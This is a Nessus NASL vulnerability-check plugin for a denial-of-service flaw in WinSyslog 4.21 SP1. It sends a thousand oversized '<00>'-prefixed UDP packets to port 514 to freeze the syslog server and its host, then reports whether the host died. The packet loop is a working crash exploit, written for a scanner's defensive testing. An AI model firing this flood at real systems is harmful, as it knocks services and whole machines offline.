#
# WinSysLog DoS
# http://www.winsyslog.com
#


if(description)
{
	script_id(11884);
	script_bugtraq_id(8821);
	script_version("$Revision: 1.7 $");
	name["english"] = "WinSyslog (DoS)";
	script_name(english:name["english"]);

	desc["english"] = "
WinSyslog is an enhanced syslog server for Windows. A vulnerability in the product allows 
remote attackers to cause the WinSyslog to freeze, which in turn will also freeze the operating 
system on which the product executes.
	
Vulnerable version: WinSyslog Version 4.21 SP1 (http://www.winsyslog.com)
Solution: contact vendor http://www.winsyslog.com
	
Risk factor: High";

	script_description(english:desc["english"]);
        summary["english"] = "Attempts to crash the remote host";
	script_summary(english:summary["english"]);
	script_category(ACT_DENIAL);	# ACT_FLOOD?
	script_copyright(english:"This script is copyright (C) 2003 Matthew North");
	family["english"] = "Denial of Service";
  	script_dependencies('os_fingerprint.nasl');
	script_family(english:family["english"]);
	exit(0);
}


include('global_settings.inc');

os = get_kb_item("Host/OS/icmp");
if ( os && "Windows" >!< os ) exit(0);

if ( report_paranoia < 2 ) exit(0);


soc = open_sock_udp(514);
if(!soc) exit(0);
start_denial();

for(i=0; i < 1000; i++) {
                        num = (600+i)*4;
			bufc = string(crap(num));
                        buf = string("<00>", bufc); 
	                send(socket:soc,data:buf);
            }

close(soc);
sleep(5);
alive = end_denial();
if(!alive)security_hole(port:514, proto:"udp");
